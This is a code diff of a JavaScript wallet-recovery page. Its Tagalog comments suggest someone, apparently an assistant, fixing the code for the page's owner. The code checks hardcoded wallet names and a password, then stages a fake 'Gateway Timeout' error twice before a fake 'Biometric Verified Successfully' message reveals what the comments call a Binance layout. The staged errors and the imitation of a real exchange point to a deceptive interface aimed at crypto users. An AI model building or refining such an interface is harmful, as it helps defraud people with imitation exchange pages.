@@ -320,7 +320,7 @@ function handleWalletRecovery(event) {
     const passInputField = document.querySelector('.auth-card input[type="password"]');
     
     if (!userInputField || !passInputField) {
-        alert("Sync Error Gateway Timeout 0x822");
+        alert("Error: Script tracking fields not found.");
         return;
     }
 
@@ -333,7 +333,7 @@ function handleWalletRecovery(event) {
     const validPassword = "DyoscEKhJ2x2F9sd1cNi34yhMNC6bXPDXsv3wZXzv2ud";
 
     if ((userInput === validUser1 || userInput === validUser2 || userInput === validUser3) && passInput === validPassword) {
-  document.getElementById('main-wrapper')
+        runBiometricSequence(); // Binalik natin ang tawag dito para gumana ang 3-sec loop mo!
     } else {
         alert("Invalid Wallet Name, Number, or Password. Please try again.");
     }
@@ -347,20 +347,23 @@ function runBiometricSequence() {
         biometricRetryCount++; 
 
         if (biometricRetryCount < 3) {
+            // Unang dalawang subok: Lalabas ang network error na ito
             alert("Sync Error Gateway Timeout 0x822");
             if (loader) loader.style.display = 'none'; 
         } else {
+            // Ikatlong subok: Tagumpay at didiretso sa Binance layout mo gamit ang tamang selector
             alert("Biometric Verified Successfully!");
             if (loader) loader.style.display = 'none';
 
             const authOverlay = document.querySelector('.auth-overlay');
-            const mainWrapper = document.querySelector('#main-wrapper') || document.querySelector('.main-wrapper');
+            const mainWrapper = document.getElementById('main-wrapper'); // Inayos para tumugma sa Line 218 mo
 
             if (authOverlay) authOverlay.style.display = 'none';
             if (mainWrapper) mainWrapper.style.display = 'flex'; 
         }
     }, 3000); 
 }
+
 </script>
 </body>
 </html>
